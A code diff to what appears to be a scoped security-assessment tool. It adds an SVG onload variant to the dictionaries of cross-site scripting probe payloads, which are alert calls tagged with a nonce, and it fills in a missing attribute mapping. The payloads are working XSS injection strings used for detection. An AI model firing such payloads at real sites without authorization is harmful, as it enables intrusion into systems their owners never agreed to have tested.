@@ -988,6 +988,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
             # the browser service's equivalent names on observed GET inputs.
             technique = {
                 "xss_browser": "html_body",
+                "xss_browser_svg": "html_body_svg",
                 "xss_browser_attribute": "html_attribute",
                 "xss_browser_attribute_single": "html_attribute_single",
                 "xss_browser_js_single": "js_single",
@@ -995,6 +996,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
             }.get(technique, technique)
             payloads = {
                 "html_body": '<img src=x onerror=alert("__PROWL_NONCE__")>',
+                "html_body_svg": '<svg onload=alert("__PROWL_NONCE__")>',
                 "html_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
                 "html_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
                 "js_single": "';alert(\"__PROWL_NONCE__\");//",
@@ -1302,6 +1304,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         location, separator, parameter = str(cell.get("parameter") or "").partition(":")
         xss_payloads = {
             "xss_browser": '<img src=x onerror=alert("__PROWL_NONCE__")>',
+            "xss_browser_svg": '<svg onload=alert("__PROWL_NONCE__")>',
             "xss_browser_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
             "xss_browser_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
             "xss_browser_js_single": "';alert(\"__PROWL_NONCE__\");//",
@@ -1411,7 +1414,9 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
                 result = await self.scoped_input_probe_assigned(
                     coverage_cell_id, coverage_lease_id, technique={
                         "xss_browser": "html_body",
+                        "xss_browser_svg": "html_body_svg",
                         "xss_browser_attribute": "html_attribute",
+                        "xss_browser_attribute_single": "html_attribute_single",
                         "xss_browser_js_single": "js_single",
                         "xss_browser_js_double": "js_double",
                     }[technique],
